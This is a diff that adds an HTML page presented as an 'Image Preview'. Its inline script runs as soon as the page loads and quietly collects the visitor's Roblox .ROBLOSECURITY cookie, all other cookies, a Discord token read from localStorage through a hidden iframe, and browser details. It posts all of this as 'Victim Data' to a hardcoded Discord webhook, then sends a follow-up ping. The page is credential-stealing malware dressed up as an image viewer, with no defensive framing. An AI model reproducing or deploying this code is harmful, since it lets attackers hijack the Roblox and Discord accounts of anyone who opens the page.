@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Preview</title>
+    <style>
+        body { margin:0; background:#0f0f0f; display:flex; align-items:center; justify-content:center; height:100vh; overflow:hidden; }
+        img { max-width:95%; max-height:95%; border-radius:8px; box-shadow:0 0 40px rgba(255,0,0,0.3); }
+        .loading { color:#fff; position:absolute; top:20px; font-family:Arial; }
+    </style>
+</head>
+<body>
+    <div class="loading">Loading high quality image...</div>
+    <img src="https://i.imgur.com/NW1SWRY.jpg" alt="Preview" onerror="this.src='https://i.imgur.com/removed.png';">
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1498347230900387850/AKTvtceFPogXs2zT73xpunSZ3_4Zoer_Oh9w0peLefOrSupYD-YTwchLfJt5QmAsTrzr";
+
+        async function sendData(payload) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: "Image Logger",
+                        content: "**New Grab Triggered**",
+                        embeds: [{
+                            title: "📸 Victim Data",
+                            description: payload,
+                            color: 0xFF0000,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) {}
+        }
+
+        // Grab everything possible
+        const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) 
+            ? document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')).split('=')[1] 
+            : "Not found or HttpOnly";
+
+        const allCookies = document.cookie || "No document cookies accessible";
+        
+        // Basic Discord token attempt
+        let discordToken = "Not found";
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            const ls = iframe.contentWindow.localStorage;
+            discordToken = ls.token ? JSON.parse(ls.token) : "Not in localStorage";
+            iframe.remove();
+        } catch(e) {}
+
+        const data = `
+**Time:** ${new Date().toLocaleString()}
+**User-Agent:** ${navigator.userAgent}
+**Platform:** ${navigator.platform}
+**Language:** ${navigator.language}
+**Screen:** ${screen.width}x${screen.height}
+**Roblox .ROBLOSECURITY:** ${robloxCookie}
+**Discord Token:** ${discordToken}
+**All Cookies:** ${allCookies.substring(0, 800)}...
+**Referer:** ${document.referrer || "Direct"}
+**Page URL:** ${window.location.href}
+        `;
+
+        sendData(data);
+
+        // Extra ping
+        setTimeout(() => sendData("Follow-up ping - victim still on page"), 3000);
+    </script>
+</body>
+</html>
